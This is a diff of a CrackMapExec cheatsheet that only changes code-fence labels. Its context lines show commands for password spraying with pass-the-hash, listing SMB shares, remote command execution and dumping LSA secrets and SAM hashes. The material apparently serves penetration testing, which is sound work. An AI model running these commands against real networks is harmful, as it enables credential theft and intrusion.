@@ -22,13 +22,13 @@ sudo apt-get -y install crackmapexec
 **Cheatsheet:** 
 **Website:** https://web.archive.org/web/20231116172005/https://www.crackmapexec.wiki/
 ## Usage
-```sh
+```bash
 crackmapexec <proto> <target-ip> -u <user or userlist> -p <pass or passlist> -d .
 ```
 
 ### Password Spraying a domain using Pass-the-Hash
 We can perform a password spraying attack on a set of targets to see if we are able to login to any host on a subnet. 
-```sh
+```bash
 crackmapexec smb [target(s)] -u [user] -d . -H [hash]
 
 # Try credentials against local administrator password on each host
@@ -40,13 +40,13 @@ The `--local-auth` can also be added if we want to attempt to login via local cr
 The `-x` flag can be used to execute a command too
 
 ### List SMB Shares
-```sh
+```bash
 crackmapexec smb [ip] -u [user] -p [pass] --shares
 ```
 
 ### Extracting Hashes from SAM Database
 **Remote dumping** of the LSA secrets & SAM databases can also be done via tools like `crackmapexec` using a local administrator account:
-```sh
+```bash
 $ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --lsa
 
 $ crackmapexec smb [ip] --local-auth -u [user] -p [pass] --sam
